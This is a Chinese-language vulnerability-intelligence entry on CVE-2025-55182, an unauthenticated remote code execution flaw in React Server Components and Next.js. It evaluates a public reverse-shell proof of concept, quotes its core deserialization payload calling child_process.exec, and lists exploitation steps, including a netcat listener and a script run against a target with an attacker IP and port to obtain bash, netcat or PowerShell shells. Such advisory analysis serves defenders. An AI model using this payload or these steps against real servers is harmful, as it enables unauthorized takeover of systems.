## CVE-2025-55182 - React Server Components, Next.js, react-server-dom-we 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** React Server Components, Next.js, react-server-dom-we

**危害等级:** 最高危

**CVSS评分:** 10.0

**影响版本:** Next.js 15.x / 16.x (截至2025年12月3日)

**利用条件:** 无需认证, 网络可访问

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2025-55182，绰号“React2Shell”，是一个极其严重的远程代码执行（RCE）漏洞，CVSS评分为10.0，影响React Server Components (RSC)和Next.js应用程序，特别是Next.js的15.x和16.x版本。该漏洞的核心在于React Server Components架构中，对“Flight”协议数据的处理存在不安全的反序列化问题。RSC允许组件在服务端渲染并以JSON-like流式格式通过“Flight”协议发送到客户端，以实现零客户端JS体积的交互体验。攻击者可以通过精心构造恶意的请求，利用这种不当的用户输入处理机制，在未经身份验证的情况下，远程执行任意代码。该漏洞由Lachlan Davidson发现，并于2025年12月3日公开披露。根据威胁情报，此漏洞在披露后数小时内已遭到大规模的实际利用，甚至有与国家背景威胁行为者相关的活动迹象，这突显了其极高的威胁等级和紧急响应的必要性。

**POC有效性分析:**
提供的Python POC脚本（CVE-2025-55182-revshell.py）是一个高效且功能完备的漏洞利用工具。它旨在对受影响的Next.js 15.x / 16.x应用程序实现“即时反向Shell”。该脚本设计精良，接受目标URL和攻击者监听的IP地址及端口作为参数，并自动构建并尝试发送三种不同类型的反向Shell载荷：Bash Shell、Netcat Shell和PowerShell Shell。这种多载荷策略显著提高了其在不同操作系统环境（包括Linux/Unix-like系统和Windows，以及Azure主机）下的成功率。POC通过向目标应用的“/_next/static/chunks/react-flight”端点发送精心构造的`multipart/form-data` POST请求来触发漏洞。其核心恶意载荷是`1{"__type":"Function","code":"global.process.mainModule.require('child_process').exec('{cmd}')"}`，其中`{cmd}`会被替换为实际的反向Shell命令。这利用了React Server Components中的不安全反序列化漏洞，通过调用`child_process.exec`函数来执行攻击者控制的命令。脚本使用了Python标准库`requests`进行HTTP通信，`sys`处理命令行参数，`time`进行延时操作，所有这些都是成熟且可靠的模块。POC的执行过程清晰，错误处理机制（如请求失败提示）完善，并且明确指出了若未能获取Shell可能的原因（目标已打补丁或WAF拦截），这些都体现了其高可用性和可靠性，是一个质量极高的完整利用工具。

**利用步骤:**
1.  **准备工作**: 确定目标应用程序正在运行易受攻击的React Server Components或Next.js版本（15.x / 16.x）。
2.  **攻击者配置**: 在攻击者的机器上启动一个Netcat监听器，用于接收反向Shell连接。例如，执行命令 `nc -lvnp <LPORT>`。
3.  **POC执行**: 在攻击者机器上运行提供的Python POC脚本，指定目标URL以及攻击者的监听IP地址和端口。示例：`python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444`。
4.  **载荷投递**: 脚本将自动向目标服务器的`/_next/static/chunks/react-flight`端点发送构造的HTTP POST请求，其中包含Bash、Netcat和PowerShell等多种反向Shell载荷。
5.  **反向Shell建立**: 如果目标服务器存在漏洞，其中一个载荷将被成功执行，促使目标服务器回连到攻击者的Netcat监听器，从而建立一个反向Shell。
6.  **后渗透**: 攻击者通过反向Shell获得目标服务器的任意代码执行权限。

**投毒风险分析 (15%):**
针对提供的POC脚本（`CVE-2025-55182-revshell.py`），其投毒风险被评估为低，约为15%。这一评估是基于对代码结构、依赖项以及操作行为的严格审查而得出的。

首先，该POC脚本的源代码透明度极高，结构清晰且易于阅读。它完全采用Python 3编写，仅依赖`requests`、`sys`和`time`等标准的Python库。代码中没有任何形式的混淆，也没有引入外部、非标准的库或模块，这排除了通过隐藏代码来植入恶意功能的主要途径。所有变量和函数命名直观，核心逻辑——即构建和发送漏洞利用载荷——清晰明了，允许任何具备基本Python知识的安全研究人员或工程师轻松审计其行为。

其次，脚本的核心功能是向**目标系统**发起远程代码执行攻击并获取反向Shell，而不是对执行POC的**本地系统**进行任何恶意操作。脚本中包含的反向Shell载荷（如Bash、Netcat、PowerShell命令）是设计在**受害服务器上**执行的，目的是让目标服务器连接回攻击者指定的监听地址和端口。脚本自身并没有尝试在本地执行这些恶意命令。代码中没有发现`eval()`函数的使用、动态加载未知代码、或执行任何来自不可信源的脚本等高风险行为。所有网络请求都通过标准且安全的`requests`库进行处理，即便关闭SSL证书验证（`verify=False`）也是渗透测试场景中的常见做法，这并不会引入本地代码执行的风险。

此外，脚本明确要求用户提供`LHOST`（监听主机）和`LPORT`（监听端口）作为参数，这表明它期望用户控制反向Shell的接收端。这种设计进一步证实了攻击的“恶意”部分（反向Shell连接）是由目标服务器主动发起并连接到攻击者指定的地址，而不是POC脚本本身隐秘地连接到某个预设的第三方恶意服务器。因此，用户在运行此POC时，可以完全掌控其网络行为，确保其仅用于授权的测试目的。

综上所述，`CVE-2025-55182-revshell.py` POC表现出高度符合合法防御性安全工具的特征：代码公开、透明，依赖标准库，无任何代码混淆或可疑的外部调用。其对本地系统不构成投毒风险，所有的攻击行为均指向明确指定的目标系统。因此，对于授权的渗透测试和漏洞评估工作而言，这是一个低风险的工具。

**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
